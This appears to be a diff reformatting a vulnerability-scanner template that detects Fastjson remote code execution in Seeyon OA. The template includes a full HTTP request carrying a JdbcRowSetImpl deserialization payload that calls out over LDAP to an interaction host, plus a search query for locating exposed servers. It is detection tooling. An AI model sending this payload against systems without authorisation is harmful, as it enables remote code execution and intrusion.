@@ -1,5 +1,4 @@
 id: seeyon-oa-fastjson-rce
-
 info:
   name: Seeyon OA Fastjson Remote Code Execution
   author: SleepingBag945
@@ -8,31 +7,31 @@ info:
   reference:
     - https://github.com/achuna33/MYExploit/blob/8ffbf7ee60cbd77ad90b0831b93846aba224ab29/src/main/java/com/achuna33/Controllers/SeeyonController.java
     - https://github.com/hktalent/scan4all/blob/main/pocs_go/seeyon/SeeyonFastjson.go
+  classification:
+    cwe-id:
+      - CWE-502
+      - CWE-94
   metadata:
     runzero-review: REJECT/2025-11-07/uses interactsh
-    verified: true
-    max-request: 1
     fofa-query: app="致远互联-OA"
-  tags: seeyon,oa,rce,fastjson,oast,vuln
-
+    max-request: 1
+    verified: true
+  tags: fastjson,oa,oast,rce,seeyon,vuln
 http:
-  - raw:
+  - matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+      - part: body
+        type: word
+        words:
+          - com.alibaba.fastjson.JSONException
+    matchers-condition: and
+    raw:
       - |
         POST /seeyon/main.do?method=changeLocale HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
         _json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "dns"
-
-      - type: word
-        part: body
-        words:
-          - "com.alibaba.fastjson.JSONException"
-
